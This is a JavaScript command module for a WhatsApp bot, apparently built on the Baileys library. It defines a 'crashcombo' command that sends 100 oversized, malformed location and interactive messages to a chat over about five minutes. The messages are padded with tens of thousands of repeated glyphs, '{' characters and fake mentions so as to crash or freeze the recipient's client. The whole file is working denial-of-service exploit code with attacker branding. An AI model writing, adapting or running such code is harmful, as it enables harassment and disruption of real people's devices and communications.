let handler = async (m, { conn }) => {
  const botJid = conn.user?.id || conn.user?.jid;
  const target = m.chat;

  // Solo el bot puede usar este comando
  if (m.sender !== botJid) {
    return m.reply("⚠️ Solo el bot puede usar este comando.");
  }

  const delay = (ms) => new Promise((res) => setTimeout(res, ms));

  // Función Crashui
  async function Crashui(target) {
    let Crash = "༑⌁⃰Dapzy Is hereཀ‌‌🦠" + "ꦾ".repeat(65000);
    await conn.relayMessage(
      target,
      {
        locationMessage: {
          degreesLatitude: 999.03499999999999,
          degreesLongitude: -999.03499999999999,
          name: Crash,
          url: "https://youtube.com/@DavaExploit",
          address: "𑇂𑆵𑆴𑆿".repeat(45000),
        },
        hasMediaAttachment: true,
      },
      {
        participant: {
          jid: target,
          mentionedJid: [
            "0@s.whatsapp.net",
            ...Array.from({ length: 30000 }, () =>
              "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
            ),
          ],
        },
      }
    );
  }

  // Función ForceXsystem
  async function ForceXsystem(kirana, target) {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 99999999,
              businessMessageForwardInfo: {
                businessOwnerJid: target,
              },
            },
            body: {
              text: "༑⌁⃰Dapzy Is hereཀ‌‌🦠" + "ꦾ".repeat(35000),
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(15000),
              buttons: [
                { name: "single_select", ParamsJson: "{".repeat(15000), version: 3 },
                { name: "call_permission_request", ParamsJson: "{".repeat(15000), version: 3 },
                { name: "cta_url", ParamsJson: "{".repeat(15000), version: 3 },
                { name: "cta_call", ParamsJson: "{".repeat(15000), version: 3 },
                { name: "cta_copy", ParamsJson: "{".repeat(15000), version: 3 },
                { name: "cta_reminder", ParamsJson: "{".repeat(15000), version: 3 },
                { name: "cta_cancel_reminder", ParamsJson: "{".repeat(15000), version: 3 },
                { name: "address_message", ParamsJson: "{".repeat(15000), version: 3 },
                { name: "send_location", ParamsJson: "{".repeat(15000), version: 3 },
                { name: "quick_reply", ParamsJson: "{".repeat(15000), version: 3 },
                { name: "mpm", ParamsJson: "{".repeat(10000), version: 3 },
              ],
            },
          },
        },
      },
    };

    await kirana.relayMessage(target, message, {
      participant: { jid: target },
    });
  }

  // Secuencia de 100 mensajes en 5 min
  for (let i = 0; i < 25; i++) {
    await Crashui(target);
    await delay(3000);
  }
  for (let i = 0; i < 25; i++) {
    await ForceXsystem(conn, target);
    await delay(3000);
  }
  for (let i = 0; i < 25; i++) {
    await Crashui(target);
    await delay(3000);
  }
  for (let i = 0; i < 25; i++) {
    await ForceXsystem(conn, target);
    await delay(3000);
  }

  m.reply("✅ Secuencia completada.");
};

handler.command = /^crashcombo$/i;
export default handler;